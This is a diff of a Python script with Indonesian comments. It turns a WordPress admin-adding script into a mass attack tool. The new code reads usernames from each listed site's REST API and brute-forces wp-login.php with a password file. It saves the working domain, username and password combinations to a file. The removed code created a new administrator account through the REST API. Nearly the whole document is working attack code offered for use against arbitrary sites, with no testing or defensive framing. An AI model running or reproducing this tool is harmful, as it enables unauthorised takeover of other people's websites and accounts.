@@ -1,51 +1,63 @@
 import sys
 import requests
-from requests.auth import HTTPBasicAuth
+from colorama import init, Fore
 
-# Fungsi untuk menambah admin
-def add_admin(domain, wp_user, wp_pass, new_user, new_pass, new_email):
+# Inisialisasi colorama
+init(autoreset=True)
+
+# Fungsi untuk mengambil username dari REST API
+def get_usernames(domain):
     url = f"http://{domain}/wp-json/wp/v2/users"
-    user_data = {
-        "username": new_user,
-        "password": new_pass,
-        "email": new_email,
-        "roles": ["administrator"]
-    }
-
     try:
-        # Kirim permintaan POST dengan autentikasi dasar
-        response = requests.post(url, json=user_data, auth=HTTPBasicAuth(wp_user, wp_pass))
-
-        # Cek status code dan output hasil
-        if response.status_code == 201:
-            result = f"https://{domain}/ > berhasil add admin"
-            print(result)
-            # Simpan hasil berhasil ke dalam file
-            with open('result.txt', 'a') as file:
-                file.write(f"{domain} > berhasil add admin\n")
+        response = requests.get(url, timeout=10)
+        if response.status_code == 200:
+            users = response.json()
+            return [user['slug'] for user in users]  # Ambil slug sebagai username
         else:
-            print(f"https://{domain}/ > gagal add admin")
+            print(f"https://{domain}/ > gagal mendapatkan username")
+            return []
     except Exception as e:
-        print(f"https://{domain}/ > gagal add admin")
+        print(f"https://{domain}/ > error mengambil username")
+        return []
+
+# Fungsi untuk mencoba brute force login
+def brute_force_login(domain, usernames, passwords):
+    login_url = f"http://{domain}/wp-login.php"
+    for username in usernames:
+        for password in passwords:
+            data = {'log': username, 'pwd': password}
+            try:
+                response = requests.post(login_url, data=data, timeout=10)
+                if "wp-admin" in response.url or "dashboard" in response.text:
+                    result = f"https://{domain}/wp-login.php:{username}:{password} > berhasil login admin"
+                    print(Fore.GREEN + result)  # Teks hijau untuk berhasil
+                    # Simpan hasil berhasil ke file ress.txt
+                    with open('ress.txt', 'a') as file:
+                        file.write(result + "\n")
+                    return  # Berhenti setelah berhasil login
+                else:
+                    print(f"https://{domain}/ > gagal login admin")
+            except Exception as e:
+                print(f"https://{domain}/ > error saat brute force")
 
 # Fungsi utama
 def main():
-    if len(sys.argv) != 2:
-        print("Penggunaan: python add_admin.py <listdomain.txt>")
+    if len(sys.argv) != 3:
+        print("Penggunaan: python brute_force.py <listdomain.txt> <listpassword.txt>")
         sys.exit(1)
 
-    # Load domain dari file
+    # Membaca daftar domain dan password dari file
     with open(sys.argv[1], 'r') as file:
         domains = file.read().splitlines()
 
-    # Data admin baru
-    new_user = "newadmin"
-    new_pass = "StrongPassword123!"
-    new_email = "newadmin@example.com"
+    with open(sys.argv[2], 'r') as file:
+        passwords = file.read().splitlines()
 
-    # Loop setiap domain
+    # Proses brute force untuk setiap domain
     for domain in domains:
-        add_admin(domain, "existing_admin", "existing_password", new_user, new_pass, new_email)
+        usernames = get_usernames(domain)
+        if usernames:
+            brute_force_login(domain, usernames, passwords)
 
 if __name__ == "__main__":
     main()
